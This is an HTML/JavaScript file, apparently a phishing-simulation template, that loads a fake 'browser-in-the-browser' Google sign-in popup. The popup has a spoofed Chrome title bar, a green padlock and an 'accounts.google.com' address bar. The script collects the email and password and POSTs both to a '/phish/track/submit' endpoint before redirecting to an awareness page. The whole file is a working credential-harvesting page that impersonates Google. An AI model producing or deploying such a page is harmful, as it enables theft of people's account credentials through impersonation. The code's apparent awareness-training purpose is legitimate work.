<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google</title>
</head>
<body style="margin:0;background:#f1f3f4;">
<script>
/* ── Tracking params from click-redirect URL ─────────────────────────── */
const _p   = new URLSearchParams(window.location.search);
const _cid = _p.get('cid') || '';
const _rid = _p.get('rid') || '';
const _sub = window.location.origin + '/phish/track/submit/' + _cid + '/' + _rid;

/* ── Google G-mark SVG ───────────────────────────────────────────────── */
const _gmark = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="44" height="44">
  <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0
    14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
  <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94
    c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
  <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59
    l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
  <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6
    c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19
    C6.51 42.62 14.62 48 24 48z"/>
</svg>`;

/* ── Google text wordmark ────────────────────────────────────────────── */
const _gtxt = `<span style="font-size:22px;font-weight:400;color:#5f6368;letter-spacing:-0.5px">
  <span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span>
</span>`;

/* ── Padlock SVG (green) ─────────────────────────────────────────────── */
const _lock = `<svg width="11" height="13" viewBox="0 0 24 24" fill="#1e8e3e" style="flex-shrink:0">
  <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10
    c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2
    s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1
    1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>`;

function createGooglePopup() {
  if (document.getElementById('jsFakePopup')) return;

  /* ── Overlay ─────────────────────────────────────────────────────── */
  const overlay = document.createElement('div');
  overlay.id = 'jsFakePopup';
  Object.assign(overlay.style, {
    position: 'fixed', top: '0', left: '0', width: '100%', height: '100%',
    background: 'rgba(0,0,0,0.45)', display: 'flex', justifyContent: 'center',
    alignItems: 'flex-start', zIndex: '9999',
    paddingTop: '32px', boxSizing: 'border-box'
  });

  /* ── Window ──────────────────────────────────────────────────────── */
  const win = document.createElement('div');
  Object.assign(win.style, {
    width: '430px', background: '#fff', borderRadius: '0 0 8px 8px',
    boxShadow: '0 8px 30px rgba(0,0,0,0.4)',
    fontFamily: "'Google Sans',Roboto,Arial,sans-serif",
    overflow: 'hidden', position: 'absolute', top: '32px', left: 'calc(50% - 215px)'
  });

  /* ── Chrome title bar ────────────────────────────────────────────── */
  const tb = document.createElement('div');
  Object.assign(tb.style, {
    background: '#3c4043', color: '#bdc1c6', padding: '7px 10px',
    display: 'flex', justifyContent: 'space-between', alignItems: 'center',
    fontSize: '12px', cursor: 'move', userSelect: 'none'
  });
  tb.innerHTML = `
    <div style="display:flex;align-items:center;gap:7px">
      <svg width="14" height="14" viewBox="0 0 48 48">
        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38
          30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94
          c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59
          l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6
          c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19
          C6.51 42.62 14.62 48 24 48z"/>
      </svg>
      <span>Sign in – Google Accounts</span>
    </div>
    <div style="display:flex;gap:14px;font-size:14px">
      <span style="cursor:pointer" title="Minimise" onclick="document.getElementById('jsFakePopup').remove()">&#8211;</span>
      <span title="Maximise">&#9633;</span>
      <span style="cursor:pointer" title="Close" onclick="document.getElementById('jsFakePopup').remove()">&#x2715;</span>
    </div>`;

  /* ── Chrome URL bar ──────────────────────────────────────────────── */
  const ub = document.createElement('div');
  Object.assign(ub.style, {
    background: '#f1f3f4', padding: '5px 12px', fontSize: '12px',
    borderBottom: '1px solid #dadce0', display: 'flex', alignItems: 'center', gap: '5px'
  });
  ub.innerHTML = _lock +
    `<span style="color:#1e8e3e;font-weight:500">https://accounts.google.com</span>`;

  /* ── Login content ───────────────────────────────────────────────── */
  const ct = document.createElement('div');
  ct.style.cssText = 'padding:48px 48px 40px;';
  ct.innerHTML = `
    <div style="text-align:center;margin-bottom:24px">${_gmark}<br>${_gtxt}</div>

    <!-- ── Step 1: email ── -->
    <div id="gs1">
      <h1 style="font-size:24px;font-weight:400;color:#202124;margin:0 0 8px;text-align:center">Sign in</h1>
      <p style="font-size:16px;color:#202124;margin:0 0 28px;text-align:center">Use your Google Account</p>

      <div style="position:relative;margin-bottom:8px">
        <input id="g-em" type="email" autocomplete="username"
          style="width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;
                 font-size:16px;color:#202124;box-sizing:border-box;outline:none;font-family:inherit;
                 transition:border .15s,box-shadow .15s"
          onfocus="this.style.borderColor='#1a73e8';this.style.boxShadow='0 0 0 2px #c6dafc'"
          onblur="this.style.borderColor='#dadce0';this.style.boxShadow='none'"
          onkeydown="if(event.key==='Enter')_gNext()"
          placeholder="Email or phone">
      </div>

      <div style="font-size:14px;margin-bottom:28px">
        <a href="#" style="color:#1a73e8;text-decoration:none">Forgot email?</a>
      </div>

      <p style="font-size:13px;color:#5f6368;margin:0 0 32px;line-height:1.5">
        Not your computer? Use Guest mode to sign in privately.
        <a href="#" style="color:#1a73e8;text-decoration:none">Learn more about using Guest mode</a>
      </p>

      <div style="display:flex;justify-content:space-between;align-items:center">
        <a href="#" style="color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none">Create account</a>
        <button onclick="_gNext()"
          style="background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;
                 font-size:14px;font-weight:500;cursor:pointer;font-family:inherit;
                 transition:background .15s"
          onmouseover="this.style.background='#1765cc'"
          onmouseout="this.style.background='#1a73e8'">Next</button>
      </div>
    </div>

    <!-- ── Step 2: password ── -->
    <div id="gs2" style="display:none">
      <div id="g-chip"
        style="display:inline-flex;align-items:center;gap:8px;background:#f1f3f4;
               border-radius:20px;padding:6px 14px 6px 6px;cursor:pointer;margin-bottom:24px"
        onclick="_gBack()">
        <div id="g-av"
          style="width:30px;height:30px;background:#1a73e8;border-radius:50%;display:flex;
                 align-items:center;justify-content:center;color:#fff;font-size:14px;font-weight:600">?</div>
        <span id="g-em2" style="font-size:14px;color:#202124"></span>
        <svg width="16" height="16" viewBox="0 0 24 24" fill="#5f6368"><path d="M7 10l5 5 5-5z"/></svg>
      </div>

      <h1 style="font-size:24px;font-weight:400;color:#202124;margin:0 0 28px">Welcome</h1>

      <div style="position:relative;margin-bottom:14px">
        <input id="g-pw" type="password" autocomplete="current-password"
          placeholder="Enter your password"
          style="width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;
                 font-size:16px;color:#202124;box-sizing:border-box;outline:none;font-family:inherit;
                 transition:border .15s,box-shadow .15s"
          onfocus="this.style.borderColor='#1a73e8';this.style.boxShadow='0 0 0 2px #c6dafc'"
          onblur="this.style.borderColor='#dadce0';this.style.boxShadow='none'"
          onkeydown="if(event.key==='Enter')_gSubmit()">
      </div>

      <div style="display:flex;align-items:center;gap:8px;margin-bottom:14px">
        <input type="checkbox" id="g-show"
          onchange="document.getElementById('g-pw').type=this.checked?'text':'password'">
        <label for="g-show" style="font-size:14px;color:#202124;cursor:pointer">Show password</label>
      </div>

      <div style="margin-bottom:36px">
        <a href="#" style="color:#1a73e8;font-size:14px;text-decoration:none">Forgot password?</a>
      </div>

      <div style="display:flex;justify-content:space-between;align-items:center">
        <button onclick="_gBack()"
          style="background:none;border:none;color:#1a73e8;font-size:14px;font-weight:500;
                 cursor:pointer;font-family:inherit;padding:10px 0">Back</button>
        <button id="g-signin-btn" onclick="_gSubmit()"
          style="background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;
                 font-size:14px;font-weight:500;cursor:pointer;font-family:inherit;
                 transition:background .15s"
          onmouseover="this.style.background='#1765cc'"
          onmouseout="this.style.background='#1a73e8'">Next</button>
      </div>
    </div>`;

  win.appendChild(tb);
  win.appendChild(ub);
  win.appendChild(ct);
  overlay.appendChild(win);
  document.body.appendChild(overlay);

  /* ── Drag ─────────────────────────────────────────────────────────── */
  let _drag = false, _ox = 0, _oy = 0;
  tb.addEventListener('mousedown', e => {
    _drag = true;
    const r = win.getBoundingClientRect();
    _ox = e.clientX - r.left; _oy = e.clientY - r.top;
    e.preventDefault();
  });
  document.addEventListener('mousemove', e => {
    if (!_drag) return;
    win.style.left = (e.clientX - _ox) + 'px';
    win.style.top  = (e.clientY - _oy) + 'px';
  });
  document.addEventListener('mouseup', () => { _drag = false; });
}

/* ── Step helpers ─────────────────────────────────────────────────────── */
function _gNext() {
  const em = document.getElementById('g-em').value.trim();
  if (!em) { document.getElementById('g-em').focus(); return; }
  document.getElementById('g-em2').textContent = em;
  document.getElementById('g-av').textContent  = em[0].toUpperCase();
  document.getElementById('gs1').style.display = 'none';
  document.getElementById('gs2').style.display = 'block';
  setTimeout(() => document.getElementById('g-pw').focus(), 60);
}

function _gBack() {
  document.getElementById('gs2').style.display = 'none';
  document.getElementById('gs1').style.display = 'block';
}

function _gSubmit() {
  const em = document.getElementById('g-em').value.trim();
  const pw = document.getElementById('g-pw').value;
  if (!pw) { document.getElementById('g-pw').focus(); return; }
  const btn = document.getElementById('g-signin-btn');
  btn.disabled = true; btn.textContent = '···';
  if (!_cid || !_rid) {
    setTimeout(() => document.getElementById('jsFakePopup').remove(), 400);
    return;
  }
  const fd = new FormData();
  fd.append('email', em);
  fd.append('password', pw);
  fetch(_sub, { method: 'POST', body: fd })
    .finally(() => {
      window.location.href = '/phish/awareness/' + _cid + '/' + _rid;
    });
}

window.addEventListener('load', createGooglePopup);
</script>
</body>
</html>
